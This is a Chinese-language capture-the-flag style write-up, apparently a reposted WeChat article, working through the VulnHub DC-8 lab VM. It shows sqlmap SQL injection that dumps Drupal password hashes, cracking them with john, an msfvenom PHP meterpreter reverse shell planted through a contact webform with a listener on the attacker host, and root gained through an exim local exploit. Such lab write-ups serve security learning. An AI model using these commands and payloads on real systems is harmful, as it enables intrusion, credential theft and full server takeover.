# vulnhub之dc8的实践

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzA3MjM5MDc2Nw==&mid=2650745764&idx=1&sn=fe42b16817de75524f94ae0c50dbd9b4&chksm=87148aa4b06303b29118096667312b894fed865c7df26c27078c9a0a4f092f6e4bf4f5ca7931&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzA3MjM5MDc2Nw==&mid=2650745764&idx=1&sn=fe42b16817de75524f94ae0c50dbd9b4&chksm=87148aa4b06303b29118096667312b894fed865c7df26c27078c9a0a4f092f6e4bf4f5ca7931&scene=27#wechat_redirect)

本周实践的是vulnhub的dc8镜像，下载地址，https://download.vulnhub.com/dc/DC-8.zip，

启动靶机，先来个地址扫描，sudo netdiscover -r 192.168.137.0/24，

![](../Images/fcc13c1fc7df9bc19668651d96d14549.png)

接着来个端口扫描，sudo nmap -sS -sV -T4 -A -p- 192.168.137.2，

![](../Images/6f9d42097a53b8d6940c27bbf5570673.png)

浏览器访问http服务看看情况，发现了疑似可SQL注入的点，

![](../Images/babe5afa2f287d666616392b4b61def0.png)

直接上sqlmap，先脱db，

sudo sqlmap -u "http://192.168.137.2/?nid=1" --dbs，

![](../Images/9dbe58e290fa6b70b4d888cc22c5a2ce.png)

有用的db应该是d7db，再脱table，

sudo sqlmap -u "http://192.168.137.2/?nid=1" -D d7db --tables，

![](../Images/276ec97de310f6429202c853b9d5d9ed.png)

有用的table应该是users，再脱字段，

sudo sqlmap -u "http://192.168.137.2/?nid=1" -D d7db -T users --columns，

![](../Images/178a88f0afec277a5a66c500aef6bd9e.png)

有用的字段应该是name和pass，再脱字段内容，

sudo sqlmap -u "http://192.168.137.2/?nid=1" -D d7db -T users -C name,pass --dump，

![](../Images/40c1cc7c09519119a0feef7dd4a6c8f1.png)

pass明显是加了密，上john破解，得到john/turtle，

sudo john --wordlist=/usr/share/wordlists/rockyou.txt dc8-pass.txt，

![](../Images/dd336bd212df47690b7f67838b727910.png)

ssh无法登录靶机，需要再试能否登录web后台，接下来就得找后台入口，

先试了dirb无果，既然知道是drupal服务，那就上专门针对性的扫描神器，

在攻击机kali里安装droopescan，

sudo apt-get install python-pip，sudo pip install droopescan，

扫描靶机，sudo droopescan scan drupal -u http://192.168.137.2，

得到了后台入口，http://192.168.137.2/user/login，  

  

![](../Images/24a62c4e28aa97cdc90604cb2043967b.png)

用john/turtle登录成功，

![](../Images/7c74dff58d6367d115e58268f0666666.png)

接下来是搞反弹webshell，发现contact us的webform能够提交代码，

跟上期一样，先做个php的webshell代码出来，

sudo msfvenom -p php/meterpreter/reverse\_tcp LHOST=192.168.137.197 LPORT=4444 R，

攻击机kali上再开个meterpreter shell监听，

use exploit/multi/handler  
set payload php/meterpreter/reverse\_tcp  
set lhost 192.168.137.197  
set lport 4444  
run

把webshell代码粘到contact us的webform内容框中，

![](../Images/dad4f1828cdaab987b0a96358a15dd48.png)

提交后meterpreter shell就过来了，不是root，需要进一步提权，

![](../Images/41857302620e5c25ee566b70028f9ee8.png)

进入/tmp目录，下载linux下的提权脚本，

https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py，

执行脚本后，一个个研究脚本给出的提权建议，都无果，

参考别人的writeup，说是exim4这个软件可利用，

![](../Images/80de69df9c3068fb217958fc0591feeb.png)

看了一下exim的软件版本，dpkg -l | grep exim，

![](../Images/378c4cf3df89b44e7c144673adcc0641.png)

在网上搜了一下exim的本地提权方法，

![](../Images/1670c7a025d1744b98c3fefff6f820b8.png)

这个链接给的方法就可用，https://www.exploit-db.com/exploits/46996，

根据链接里提示的方法，把提权脚本下载到靶机，并执行，

![](../Images/e004c1bf7c8e0e586b7825981e0bd352.png)

至此拿root权限成功。
